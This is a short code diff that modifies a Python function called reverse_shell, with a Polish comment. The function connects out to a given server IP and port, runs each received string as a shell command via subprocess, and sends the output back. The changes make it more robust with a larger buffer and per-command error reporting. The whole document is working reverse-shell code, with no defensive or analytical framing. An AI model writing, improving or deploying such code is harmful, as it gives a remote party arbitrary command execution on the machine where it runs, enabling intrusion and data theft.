@@ -7,12 +7,19 @@ def reverse_shell(server_ip, server_port):
         sock.connect((server_ip, server_port))
 
         while True:
-            command = sock.recv(1024).decode("utf-8")
-            if command.lower() == "exit":
-                break
+            try:
+                command = sock.recv(4096).decode("utf-8") 
+                if command.lower() == "exit":
+                    break
 
-            output = subprocess.getoutput(command)
-            sock.send(output.encode("utf-8"))
+                # Wykonanie komendy w shellu
+                output = subprocess.getoutput(command)
+                if not output:
+                    output = "[INFO] Command executed successfully, but no output."
+
+                sock.send(output.encode("utf-8"))
+            except Exception as e:
+                sock.send(f"[ERROR] {str(e)}".encode("utf-8"))
     except Exception as e:
         print(f"Error: {e}")
     finally:
